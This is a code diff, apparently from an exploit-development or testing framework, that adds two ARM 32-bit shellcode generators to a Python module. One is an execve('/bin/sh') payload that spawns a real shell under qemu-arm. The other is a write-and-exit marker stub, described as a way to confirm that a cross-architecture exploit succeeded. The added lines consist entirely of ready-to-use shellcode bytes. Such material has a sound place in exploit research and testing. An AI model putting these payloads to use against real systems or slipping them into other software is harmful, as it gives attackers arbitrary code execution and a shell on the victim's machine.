@@ -110,6 +110,39 @@ def execve_binsh_aarch64() -> bytes:
         "0100 00d4".replace(" ", ""))              # svc  #0
 
 
+def execve_binsh_arm() -> bytes:
+    """ARM (32-bit, ARM mode) execve("/bin/sh", NULL, NULL) -- 28 bytes, position-independent
+    (`add r0, pc, #12` points r0 at the "/bin/sh\\0" appended after the code). Like aarch64, under
+    qemu-arm this spawns a REAL shell (the guest execve is relayed to the host). Assembled against
+    arm-linux-gnueabihf-as and run under qemu-arm."""
+    return bytes.fromhex(
+        "0c008fe2"   # add r0, pc, #12   ; r0 -> "/bin/sh"
+        "0010a0e3"   # mov r1, #0        ; argv = NULL
+        "0020a0e3"   # mov r2, #0        ; envp = NULL
+        "0b70a0e3"   # mov r7, #11       ; __NR_execve
+        "000000ef"   # svc #0
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_arm(marker: bytes) -> bytes:
+    """ARM (32-bit) write(1, marker, len); exit(0). Position-independent (`add r1, pc, #20` points
+    r1 at the marker after the fixed 8-instruction/32-byte code); the length immediate is patched.
+    Confirms a cross-arch exploit by a WRITTEN marker when a shell does not come up. Assembled
+    against arm-linux-gnueabihf-as and run under qemu-arm."""
+    n = len(marker) & 0xFF
+    return struct.pack(
+        "<8I",
+        0xE3A00001,                      # mov r0, #1        ; fd = stdout
+        0xE28F1014,                      # add r1, pc, #20   ; r1 -> marker
+        0xE3A02000 | n,                  # mov r2, #len
+        0xE3A07004,                      # mov r7, #4        ; __NR_write
+        0xEF000000,                      # svc #0
+        0xE3A00000,                      # mov r0, #0
+        0xE3A07001,                      # mov r7, #1        ; __NR_exit
+        0xEF000000,                      # svc #0
+    ) + marker
+
+
 def write_marker_aarch64(marker: bytes) -> bytes:
     """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
     marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
